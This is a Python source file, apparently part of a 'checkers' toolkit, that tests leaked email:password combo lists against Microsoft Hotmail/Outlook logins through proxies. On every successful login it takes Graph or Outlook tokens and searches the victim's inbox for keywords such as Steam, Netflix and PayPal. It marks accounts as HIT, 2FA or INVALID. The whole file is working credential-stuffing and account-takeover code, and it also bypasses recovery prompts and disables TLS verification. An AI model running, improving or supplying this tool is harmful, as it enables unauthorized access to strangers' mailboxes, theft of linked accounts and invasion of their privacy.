# checkers/hotmail.py
import concurrent.futures
import configparser
import os
import random
import re
import sys
import threading
import time
import uuid
import requests
import urllib3
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from collections import deque
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HotmailChecker:
    # ====== FUNCIONES ESTÁTICAS DEL ORIGINAL ======
    
    @staticmethod
    def get_flag(country_code: str) -> str:
        flag_map = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
            'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
            'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
            'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
            'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
            'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
        }
        return flag_map.get(country_code.upper(), '🏴')

    @staticmethod
    def normalize_combo(line):
        line = line.strip()
        if not line:
            return None
        
        if ':' in line:
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if '|' in line:
            parts = line.split('|', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if ';' in line:
            parts = line.split(';', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if ',' in line:
            parts = line.split(',', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if ' ' in line:
            parts = line.split(' ', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if '\t' in line:
            parts = line.split('\t', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
        
        if '@' in line and line.count('@') == 1:
            return None
        
        return None

    @staticmethod
    def load_and_normalize_accounts(filepath):
        accounts = []
        with open(filepath, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        for line in lines:
            normalized = HotmailChecker.normalize_combo(line)
            if normalized:
                accounts.append(normalized)
        
        return accounts

    @staticmethod
    def format_proxy(proxy):
        if not proxy: return None
        proxy = proxy.strip()
        
        if proxy.startswith('http'):
            return proxy
            
        parts = proxy.split(':')
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif '@' in proxy:
            return f"http://{proxy}"
        else:
            return f"http://{proxy}"

    @staticmethod
    def create_optimized_session(proxy=None, timeout=15):
        session = requests.Session()
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        session.verify = False
        
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        return session

    # ====== CLASE MicrosoftInboxChecker adaptada ======
    
    class MicrosoftInboxChecker:
        def __init__(self, email, password, proxy=None, inbox_keywords=None):
            self.email = email
            self.password = password
            self.proxy = proxy
            self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
            self.session = HotmailChecker.create_optimized_session(proxy)
            self.access_token = None
            self.cid = None
            self.country = None
            self.name = None
            self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

        def get_urlPost_sFTTag(self):
            maxretries = 3
            attempts = 0
            
            while attempts < maxretries:
                try:
                    headers = {
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                        'Accept-Language': 'en-US,en;q=0.9', 
                        'Accept-Encoding': 'gzip, deflate, br', 
                        'Connection': 'keep-alive', 
                        'Upgrade-Insecure-Requests': '1'
                    }
                    
                    text = self.session.get(self.sFTTag_url, headers=headers, timeout=15).text
                    
                    match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                           re.search('value="(.+?)"', text, re.S) or \
                           re.search("sFTTag:'(.+?)'", text, re.S) or \
                           re.search('sFTTag:"(.+?)"', text, re.S) or \
                           re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                    
                    if match:
                        sFTTag = match.group(1)
                        match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                               re.search("urlPost:'(.+?)'", text, re.S) or \
                               re.search('urlPost:"(.+?)"', text, re.S) or \
                               re.search('<form.*?action="(.+?)"', text, re.S)
                        
                        if match:
                            urlPost = match.group(1)
                            urlPost = urlPost.replace('&amp;', '&')
                            return urlPost, sFTTag
                except Exception:
                    pass
                
                attempts += 1
                time.sleep(0.5)
            
            return None, None

        def get_xbox_rps(self, urlPost, sFTTag):
            maxretries = 3
            tries = 0
            
            while tries < maxretries:
                try:
                    data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded', 
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                        'Accept-Language': 'en-US,en;q=0.9', 
                        'Accept-Encoding': 'gzip, deflate, br', 
                        'Connection': 'close'
                    }
                    
                    login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=15)
                    
                    if '#' in login_request.url and login_request.url != self.sFTTag_url:
                        token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                        if token != 'None':
                            return 'SUCCESS'
                    
                    elif 'cancel?mkt=' in login_request.text:
                        try:
                            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                            
                            if ipt and pprid and uaid:
                                data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                                
                                action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                                if action:
                                    ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=15)
                                    
                                    return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                    if return_url:
                                        fin = self.session.get(return_url.group(), allow_redirects=True, timeout=15)
                                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                        if token != 'None':
                                            return 'SUCCESS'
                        except:
                            pass
                    
                    elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                        return '2FA'
                    
                    elif any(value in login_request.text.lower() for value in [
                        'password is incorrect', 
                        "account doesn't exist", 
                        "that microsoft account doesn't exist",
                        'sign in to your microsoft account',
                        "tried to sign in too many times with an incorrect account or password",
                        'help us protect your account'
                    ]):
                        return 'BAD'
                    
                except Exception:
                    pass
                
                tries += 1
                time.sleep(0.5)
            
            return 'BAD'

        def login(self):
            urlPost, sFTTag = self.get_urlPost_sFTTag()
            if not urlPost or not sFTTag:
                return 'BAD'
            
            return self.get_xbox_rps(urlPost, sFTTag)

        def get_graph_token(self):
            try:
                client_id = '0000000048170EF2'
                scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
                
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                
                r = self.session.get(auth_url, timeout=15)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
                if not token:
                    scope = 'https://graph.microsoft.com/Mail.Read'
                    auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                    r = self.session.get(auth_url, timeout=15)
                    parsed_fragment = parse_qs(urlparse(r.url).fragment)
                    token = parsed_fragment.get('access_token', [None])[0]
                
                return token
            except:
                return None

        def get_profile_via_graph(self, token):
            try:
                headers = {
                    'Authorization': f'Bearer {token}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10)
                
                if r.status_code == 200:
                    data = r.json()
                    self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                    if not self.country or self.country == 'Unknown':
                        try:
                            r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10)
                            if r2.status_code == 200:
                                settings = r2.json()
                                self.country = settings.get('timeZone', 'Unknown')
                        except:
                            pass
                    
                    self.name = data.get('displayName', 'Unknown')
                    return True
                return False
            except:
                return False

        def get_profile_via_substrate(self):
            try:
                self.session.get('https://outlook.live.com/owa/', timeout=10)
                
                scope = 'https://substrate.office.com/User-Internal.ReadWrite'
                client_id = '0000000048170EF2'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                
                r = self.session.get(auth_url, timeout=15)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
                if not token:
                    return False
                
                self.cid = self.session.cookies.get('MSPCID', self.email)
                
                headers = {
                    'Authorization': f'Bearer {token}',
                    'X-AnchorMailbox': f'CID:{self.cid}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Outlook-Android/2.0',
                    'Accept': 'application/json'
                }
                
                r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10)
                
                if r.status_code == 200:
                    data = r.json()
                    self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                    self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                    return True
                return False
            except:
                return False

        def check_inbox_via_graph(self):
            token = self.get_graph_token()
            if not token:
                return 0, []
            
            found_info = []
            total_found_sum = 0
            
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            for keyword in self.inbox_keywords:
                try:
                    query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                    r = self.session.get(query, headers=headers, timeout=10)
                    
                    if r.status_code == 200:
                        data = r.json()
                        total = data.get('@odata.count', 0)
                        
                        if total == 0 and 'value' in data:
                            total = len(data['value'])
                        
                        if total > 0:
                            total_found_sum += total
                            found_info.append(f"{keyword}: {total}")
                            
                            try:
                                query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                                r2 = self.session.get(query2, headers=headers, timeout=10)
                                if r2.status_code == 200:
                                    data2 = r2.json()
                                    total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                    if total2 > 0:
                                        total_found_sum += total2
                                        found_info.append(f"{keyword}(body): {total2}")
                            except:
                                pass
                except:
                    pass
            
            return total_found_sum, found_info

        def check_inbox(self):
            total_found, found_info = self.check_inbox_via_graph()
            
            if total_found > 0:
                return total_found, found_info
            
            token = self.get_access_token_for_outlook()
            if not token:
                return 0, []
            
            cid = self.session.cookies.get('MSPCID', self.email)
            
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Host': 'substrate.office.com'
            }

            found_info = []
            total_found_sum = 0
            
            url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
            
            for keyword in self.inbox_keywords:
                try:
                    payload = {
                        'Cvid': str(uuid.uuid4()),
                        'Scenario': {'Name': 'owa.react'},
                        'TimeZone': 'UTC',
                        'TextDecorations': 'Off',
                        'EntityRequests': [{
                            'EntityType': 'Conversation',
                            'ContentSources': ['Exchange'],
                            'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                            'From': 0,
                            'Query': {'QueryString': keyword},
                            'Size': 25,
                            'EnableTopResults': True,
                            'TopResultsCount': 3
                        }],
                        'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                        'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                    }
                    
                    r = self.session.post(url, json=payload, headers=headers, timeout=10)
                    if r.status_code == 200:
                        data = r.json()
                        total = 0
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        if 'Total' in result_set:
                                            total = result_set['Total']
                                        elif 'ResultCount' in result_set:
                                            total = result_set['ResultCount']
                                        elif 'Results' in result_set:
                                            total = len(result_set['Results'])
                        
                        if total > 0:
                            total_found_sum += total
                            found_info.append(f"{keyword}: {total}")
                except:
                    pass
                    
            return total_found_sum, found_info

        def get_access_token_for_outlook(self):
            try:
                self.session.get('https://outlook.live.com/owa/', timeout=10)
                
                scope = 'https://substrate.office.com/User-Internal.ReadWrite'
                client_id = '0000000048170EF2'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                
                r = self.session.get(auth_url, timeout=15)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
                if not token:
                    auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                    r = self.session.get(auth_url, timeout=15)
                    parsed_fragment = parse_qs(urlparse(r.url).fragment)
                    token = parsed_fragment.get('access_token', [None])[0]
                    
                return token
            except:
                return None

    # ====== FUNCIÓN PRINCIPAL check() ======
    
    @staticmethod
    def check(email: str, password: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Hotmail/Outlook"""
        try:
            proxy_formateado = None
            if proxy:
                proxy_formateado = HotmailChecker.format_proxy(proxy)
            
            checker = HotmailChecker.MicrosoftInboxChecker(email, password, proxy_formateado)
            
            status = checker.login()

            if status == 'SUCCESS':
                country = 'Unknown'
                country_obtenido = False
                
                graph_token = checker.get_graph_token()
                if graph_token:
                    if checker.get_profile_via_graph(graph_token):
                        country = checker.country or 'Unknown'
                        country_obtenido = True
                
                if not country_obtenido:
                    if checker.get_profile_via_substrate():
                        country = checker.country or 'Unknown'
                
                total_count, inbox_hits = checker.check_inbox()
                
                flag = HotmailChecker.get_flag(country) if country != 'Unknown' else '🏴'
                
                if total_count > 0:
                    return {
                        'status': 'HIT',
                        'email': email,
                        'password': password,
                        'country': country,
                        'flag': flag,
                        'inbox_count': total_count,
                        'inbox_hits': inbox_hits,
                        'is_premium': True
                    }
                else:
                    return {
                        'status': 'HIT',
                        'email': email,
                        'password': password,
                        'country': country,
                        'flag': flag,
                        'is_premium': True
                    }
            
            elif status == '2FA':
                return {
                    'status': '2FA',
                    'email': email,
                    'password': password,
                    'is_premium': False
                }
            
            else:
                return {
                    'status': 'INVALID',
                    'email': email,
                    'password': password,
                    'is_premium': False
                }

        except Exception as e:
            return {
                'status': 'ERROR',
                'email': email,
                'password': password,
                'error': str(e),
                'is_premium': False
            }